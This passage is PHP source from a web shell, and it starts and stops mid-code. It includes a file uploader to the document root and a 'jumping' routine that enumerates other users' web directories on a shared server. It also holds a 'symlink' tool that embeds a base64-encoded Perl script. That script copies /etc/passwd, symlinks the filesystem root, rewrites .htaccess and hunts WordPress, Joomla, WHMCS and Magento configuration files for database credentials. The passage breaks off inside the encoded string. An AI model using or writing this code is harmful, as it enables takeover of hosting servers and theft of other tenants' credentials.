                        $act = color(1, 2, "Uploaded!") . " at <i><b>" . path() . DIRECTORY_SEPARATOR . $_FILES['file']['name'] . "</b></i>";
                    } else {
                        $act = color(1, 1, "Failed to upload file!");
                    }
                } elseif ($_POST['uploadtype'] === '2') {
                    $root = $_SERVER['DOCUMENT_ROOT'] . DIRECTORY_SEPARATOR . $_FILES['file']['name'];
                    $web = $_SERVER['HTTP_HOST'] . DIRECTORY_SEPARATOR . $_FILES['file']['name'];
                    if (is_writable($_SERVER['DOCUMENT_ROOT'])) {
                        if (@copy($_FILES['file']['tmp_name'], $root)) {
                            $act = color(1, 2, "Uploaded!") . " at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
                        } else {
                            $act = color(1, 1, "Failed to upload file!");
                        }
                    } else {
                        $act = color(1, 1, "Failed to upload file!");
                    }
                }
            }
            print "$act
			  <form method='post' enctype='multipart/form-data'>
			  <input type='radio' name='uploadtype' value='1' checked><font size='2' color='red'>here[ " . writeable(path(), "Writeable") . "] 
			  <input type='radio' name='uploadtype' value='2'>doct_root [ " . writeable($_SERVER['DOCUMENT_ROOT'], "Writeable") . " ]</font> <p>
			  <input type='file' name='file'>
			  <input type='submit' value=' > ' name='upload'>
			  </form>";
        } elseif ($toolsname === "jumping") {
            $i = 0;
            foreach (getuser() as $user) {
                $path = "/home/$user/public_html";
                if (is_readable($path)) {
                    $status = color(1, 2, "[R]");
                    if (is_writable($path)) {
                        $status = color(1, 2, "[RW]");
                    }
                    $i++;
                    print "$status <a href='?dir=$path'>" . color(1, 4, $path) . "</a>";
                    if (!function_exists('posix_getpwuid')) print "<br>";
                    if (!getdomainname()) print " => " . color(1, 1, "Can't get domain name") . "<br>";
                    foreach (getdomainname() as $domain) {
                        $userdomain = (object)@posix_getpwuid(@fileowner("/etc/valiases/$domain"));
                        $userdomain = $userdomain->name;
                        if ($userdomain === $user) {
                            print " => <a href='http://$domain/' target='_blank'>" . color(1, 2, $domain) . "</a><br>";
                            break;
                        }
                    }
                }
            }
            print ($i === 0) ? "" : "<p>" . color(1, 3, "Total ada $i kamar di " . $GLOBALS['SERVERIP']) . "</p>";
        } elseif ($toolsname === "symlink") {
            if (!is_writable(path())) die(color(1, 1, "Directory '" . path() . "' is not writeable. Can't create directory 'blacksym'."));
            if (!is_dir(path() . "/blacksym/")) {
                $sym['code'] = "DQoNCiMhL3Vzci9iaW4vcGVybCAtSS91c3IvbG9jYWwvYmFuZG1pbg0KIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyANCiMNCiMJCU5hbWUgOiBQZXJsL0NHSSBDb25maWcgU3ltbGlua2VyIChXaXRoIEF1dG8gQnlwYXNzIFN5bWxpbmsgNDA0KQ0KIwkJVmVyc2lvbiA6IDEuMg0KIwkJQ3JlYXRlZCA6IDkgTWVpIDIwMTcNCiMJCUF1dGhvciA6IDB4MTk5OQ0KIwkJVGhhbmtzIFRvIDogMHhJRGlvdCAsIEluZG9uZXNpYW4gQ29kZSBQYXJ0eSAsIEphdGltNHUNCiMJCU1vcmUgSW5mbyA6IGh0dHA6Ly8weERhcmsuYmxvZ3Nwb3QuY29tDQojCQlXYW50IHRvIHJlY29kZSA/IERvbid0IGZvcmdldCBteSBuaWNrIG5hbWUgIDopDQojCQlodHRwOi8vZmFjZWJvb2suY29tL21lbGV4LjFkDQojCQkNCiMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgDQoNCnVzZSBGaWxlOjpDb3B5Ow0KdXNlIHN0cmljdDsNCnVzZSB3YXJuaW5nczsNCnVzZSBNSU1FOjpCYXNlNjQ7DQpjb3B5KCIvZXRjL3Bhc3N3ZCIsInBhc3N3ZC50eHQiKSA7DQpta2RpciAiYmxhY2tzeW0iOw0Kc3ltbGluaygiLyIsImJsYWNrc3ltL3Jvb3QiKTsNCm15ICRmaWxlbmFtZSA9ICdwYXNzd2QudHh0JzsNCm15ICRodGFjY2VzcyA9IGRlY29kZV9iYXNlNjQoIlQzQjBhVzl1Y3lCSmJtUmxlR1Z6SUVadmJHeHZkMU41YlV4cGJtdHpEUXBFYVhKbFkzUnZjbmxKYm1SbGVDQnBibVJ2ZUhCc2IybDBMbWgwYlEwS1FXUmtWSGx3WlNCMFpYaDBMM0JzWVdsdUlDNXdhSEFnRFFwQlpHUklZVzVrYkdWeUlIUmxlSFF2Y0d4aGFXNGdMbkJvY0EwS1UyRjBhWE5tZVNCQmJua05Da2x1WkdWNFQzQjBhVzl1Y3lBclEyaGhjbk5sZEQxVlZFWXRPQ0FyUm1GdVkzbEpibVJsZUdsdVp5QXJTV2R1YjNKbFEyRnpaU0FyUm05c1pHVnljMFpwY25OMElDdFlTRlJOVENBclNGUk5URlJoWW14bElDdFRkWEJ3Y21WemMxSjFiR1Z6SUN0VGRYQndjbVZ6YzBSbGMyTnlhWEIwYVc5dUlDdE9ZVzFsVjJsa2RHZzlLaUFOQ2tGa1pFbGpiMjRnSjJSaGRHRTZhVzFoWjJVdmNHNW5PMkpoYzJVMk5DeHBWa0pQVW5jd1MwZG5iMEZCUVVGT1UxVm9SVlZuUVVGQlFrRkJRVUZCVVVOQldVRkJRVUZtT0M4NWFFRkJRVUZDU0U1RFUxWlJTVU5CWjBsbVFXaHJhVUZCUVVGQmJIZFRSbXg2UVVGQlRqRjNRVUZFWkdOQ1VXbHBZbVZCUVVGQlFtd3dVbFpvTUZVeU9XMWtTR1JvWTIxVlFXUXpaRE5NYld4MVlUTk9hbGxZUW14TWJUbDVXalYyZFZCQ2IwRkJRVVpWVTFWU1FsWkVhVTV3V2tzNVUyZE9Ra1pKV0ZCMldFNXVaR3BqVW05d1dEUlZOR3RYVm5JMVFVTm9WVGRJT0VKVFprbDBRVWhyUWpsRFdITnlWekJIZDBWUmRGSjNWa3ROVW5SQlZUaGFZMWxYWVU1dFRUSlBlSEY1ZVdsWldtUmpSMGxoV2pSYU56ZE5aV1ZSWTNjMlJFWkJMMVZFVlVGQldVaElhamhvVDBGVWFqbHZVbE5sTWxveFpqSkxhbEF4Wm1kTWEyNU5VRk0xYkZjd1ZtazBjRnB2Y0haSVdFUlhLMGxvVDNJNU9XZFlWSHByY2pseGRsUkNUWFJ5VG1RNFFYTk1WbU52YlZwTFJGQTJNV3RGVEdsb1IwbEtPVkZDWjA4eWFtUnpTVVV2U21JMVQyRmpSMFpCZDBSUlJXVk5SVTlhYm1neFJYRk5RMmgwVTBJNFlUWTBRbGN5VFU1b04xRldhV2hEUjB0alRraHpkMjFhTUd4QmExbEllRVkwVVdoQ1VFTkxTVmxTVlRsc05qQTFTMjFIUTBWSlZWbDZkRU5aVFVKbWEwVnFSMW8wVDJsSWQxSlJSaXQyYTFGSEszQjBRVU5KUmxKRlNsWlFVVUYyUm1ZclFuSnFiM2xSSzBOYVpuRnhNVEU0UkZKR1JXaHFaV0ppWW1Wc05tUkhhWGxVY1dZcmRsTnlhMkZTVVM4d2RYUk1OMjFJV0d3NWRuRXJaVkF6Vlc1aWFDOUlOV2RFUzJsUFJqWTNXV1ZpV1RCa1UwcGpVa0p0TUhveWNrWnNNbmxYY0RoQlZrUkpWek15WkdFM2NFeEJRVUZCUVVWc1JsUnJVM1ZSYlVOREp5QmVYa1JKVWtWRFZFOVNXVjVlRFFwRVpXWmhkV3gwU1dOdmJpQW5aR0YwWVRwcGJXRm5aUzl3Ym1jN1ltRnpaVFkwTEdsV1FrOVNkekJMUjJkdlFVRkJRVTVUVldoRlZXZEJRVUZDUVVGQlFVRlJRMEZaUVVGQlFXWTRMemxvUVVGQlFVRllUbE5TTUVsQmNuTTBZelpSUVVGQlFWcHBVekJrUlVGUU9FRXZkMFF2YjB3eWJtdDNRVUZCUVd4M1UwWnNla0ZCUVV4RmQwRkJRM2hOUWtGS2NXTkhRVUZCUVVGa01GTlZNVVpDT1c5S1FtaGpWRXAyTWtJeVpEUkJRVUZLVFZOVlVrSldSR3BNWWxwUE9WUm9lRnBGU1ZjdmNXeDJaSFJOTXpoQ1RtZEtVVzFSWjBwSFpDdEJMMDFSUWt4M1IycHBkMGd6Ym5ka2ExTk1kRTh5ZUVWU1J6Vk1jWGhZVWxOSlVqSlpSR1pFTkVkclIwMHdVRE55WWpSaU9WQkJlakJzTjNCVGJGZHNWekJtYm01TWIyeEJTVkJDTkZCWWFEUmxSblZ1ZFdOQlNVbE1kMlJGVTJWYWVVRnBabTV3Tml0MU9XOU9URzh6WjAwelRucFVaRWhTS3k4dmVuWktUWHBUZVVwTFMyOWthVWxuT0VGWVlYaGxTWG94WWtSYU4wMTRjVTVtZEdkVFZWSkVWM2szVEZWdVdqQmtXVzE0UVVaQlZrVnNTVFpCUlVONVowbHpVVkZ6YVhwTVFrOUJRa0ZFVDJwTFFYQnhhRGQxTjBkdlExVlhhWGRaWW1WMGIxVkljbkpRWTNkRGNXOUdNa3RWWlZoTWVrVjZRbll3SzNWUmJWTklUVVZhT1VZMlUxcGpjalpwTkVselFrOWhMMkkzU0ZGTllVaDBTVUYzWjB4a1NHRnNSRUV4WlhZd1pWRmlVMnB5UlhKUmQwcHdjVVkwWlVGNEwyaHZjVVF4TXpKdFRXdEtjbWsxZFZOUGJFWm9SV2h3VlZGSmFXOXFkMkZ0VDBST2MyeHFabFZYUTNGd1RHNVBZV0ZEVTB0S2RHNWhRa056V2xscVFXeHNiVmhKTkhaaFpXOWhWbGd3WTJKVFpHaHRWVkl6ZWtGTGRrNXFXVFpXYVc5dk1IUlhlbWRGYjI1TFlsY3JTMnRIVjNRelZXNTBNRU5sUjJaS2N6bG5LMVZWTUhKRlIwaElMMGgzTDAxcVNEWXZWQ3RRVDJSR2IxSk9TME5vVFRJeWVHMVBVR1Z6Y0dwUVIxRTJTSEJPVVRJM2REWnpRVU5FVTA1aGJubHZiR3BFVEVWa1ZtRkdUMHhsT0ZwclZXcExOWFZyY1ROME56bHNVRU0zTDA5RWF6VkhZU3RaTms4MVRYRjViVTUzTTFZeGVUTm9lWHBtV0RCb2NYWktUSGxpV0Vaa0t5dG1NbVF6WkRCa2JYTXJjWFpuTkU5RWVqaG1TSGd3TDB4elltVXpPVFkwYzFNM0t6UjFSV3AxYm5CeGJWTmxObVV6UkROT05TOU9NRmRhWW5Sc2VUbG1NRGx1V2pKYUwySXlPWFl5Wmt4RlpYWjJTemx4ZGpkak1uUnZTMms0VldscFVXbHhTR0p0Tm5KcFZ6WmhNVE5tYml0NmRqY3pLMjl4YjNKb1kweG5TMVZHV0ZaUUsyWnVOVElyVEc5dWFqaEpURW93VURoYVNVTkRSamt2VUZSd1EyeG9jRUoyWjFCbGJHOU1PVlUxTlU1SlFVRkJRVUZCVTFWV1QxSkxOVU5aU1VrOUp3MEtTVzVrWlhoSloyNXZjbVVnS2k1MGVIUTBNRFFOQ2tsdVpHVjRVM1I1YkdWVGFHVmxkQ0FuYUhSMGNEb3ZMMlYyWlc1MExtbHVaRzk0Y0d4dmFYUXViM0l1YVdRdmMzbHRiR2x1YXk1amMzTW5EUXBTWlhkeWFYUmxSVzVuYVc1bElFOXVEUXBTWlhkeWFYUmxRMjl1WkNBbGUxSkZVVlZGVTFSZlJrbE1SVTVCVFVWOUlGNHVLakI0YzNsdE5EQTBJRnRPUTEwTkNsSmxkM0pwZEdWU2RXeGxJRnd1ZEhoMEpDQWxlMUpGVVZWRlUxUmZWVkpKZlRRd05DQmJUQ3hTUFRNd01pNU9RMTA9Iik7DQpteSAkc3ltID0gZGVjb2RlX2Jhc2U2NCgiVDNCMGFXOXVjeUJKYm1SbGVHVnpJRVp2Ykd4dmQxTjViVXhwYm10ekRRcEVhWEpsWTNSdmNubEpibVJsZUNCcGJtUnZlSEJzYjJsMExtaDBiUTBLU0dWaFpHVnlUbUZ0WlNBd2VERTVPVGt1ZEhoMERRcFRZWFJwYzJaNUlFRnVlUTBLU1c1a1pYaFBjSFJwYjI1eklFbG5ibTl5WlVOaGMyVWdSbUZ1WTNsSmJtUmxlR2x1WnlCR2IyeGtaWEp6Um1seWMzUWdUbUZ0WlZkcFpIUm9QU29nUkdWelkzSnBjSFJwYjI1WGFXUjBhRDBxSUZOMWNIQnlaWE56U0ZSTlRGQnlaV0Z0WW14bERRcEpibVJsZUVsbmJtOXlaU0FxRFFwSmJtUmxlRk4wZVd4bFUyaGxaWFFnSjJoMGRIQTZMeTlsZG1WdWRDNXBibVJ2ZUhCc2IybDBMbTl5TG1sa0wzTjViV3hwYm1zdVkzTnpKdz09Iik7DQpvcGVuKG15ICRmaDEsICc+JywgJ2JsYWNrc3ltLy5odGFjY2VzcycpOw0KcHJpbnQgJGZoMSAiJGh0YWNjZXNzIjsNCmNsb3NlICRmaDE7DQpvcGVuKG15ICR4eCwgJz4nLCAnYmxhY2tzeW0vbmVtdS50eHQnKTsNCnByaW50ICR4eCAiJHN5bSI7DQpjbG9zZSAkeHg7DQpvcGVuKG15ICRmaCwgJzw6ZW5jb2RpbmcoVVRGLTgpJywgJGZpbGVuYW1lKTsNCndoaWxlIChteSAkcm93ID0gPCRmaD4pIHsNCm15IEBtYXRjaGVzID0gJHJvdyA9fiAvKC4qPyk6eDovZzsNCm15ICR1c2VybnlhID0gJDE7DQpteSBAYXJyYXkgPSAoDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nLy5hY2Nlc3NoYXNoJywgdHlwZSA9PiAnV0hNLWFjY2Vzc2hhc2gnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NvbmZpZy9rb25la3NpLnBocCcsIHR5cGUgPT4gJ0xva29tZWRpYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY29uZmlnL3NldHRpbmdzLmluYy5waHAnLCB0eXBlID0+ICdQcmVzdGFTaG9wJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9hcHAvZXRjL2xvY2FsLnhtbCcsIHR5cGUgPT4gJ01hZ2VudG8nIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2FkbWluL2NvbmZpZy5waHAnLCB0eXBlID0+ICdPcGVuQ2FydCcgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYXBwbGljYXRpb24vY29uZmlnL2RhdGFiYXNlLnBocCcsIHR5cGUgPT4gJ0VsbGlzbGFiJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC93cC90ZXN0L3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2Jsb2cvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmV0YS93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9wb3J0YWwvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc2l0ZS93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC93cC93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9XUC93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9uZXdzL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dvcmRwcmVzcy93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC90ZXN0L3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2RlbW8vd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvaG9tZS93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC92MS93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC92Mi93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9wcmVzcy93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9uZXcvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmxvZ3Mvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2Jsb2cvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdeV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2Ntcy9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmV0YS9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvcG9ydGFsL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zaXRlL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9tYWluL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9ob21lL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9kZW1vL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC90ZXN0L2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC92MS9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvdjIvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2pvb21sYS9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbmV3L2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9XSE1DUy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dobWNzMS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1dobWNzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd2htY3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC93aG1jcy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1dITUMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9XaG1jL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd2htYy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1dITS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1dobS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dobS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0hPU1Qvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9Ib3N0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvaG9zdC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1NVUFBPUlRFUy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1N1cHBvcnRlcy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3N1cHBvcnRlcy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2RvbWFpbnMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9kb21haW4vc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9Ib3N0aW5nL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvSE9TVElORy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2hvc3Rpbmcvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DQVJUL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2FydC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NhcnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9PUkRFUi9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL09yZGVyL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvb3JkZXIvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DTElFTlQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DbGllbnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jbGllbnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DTElFTlRBUkVBL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0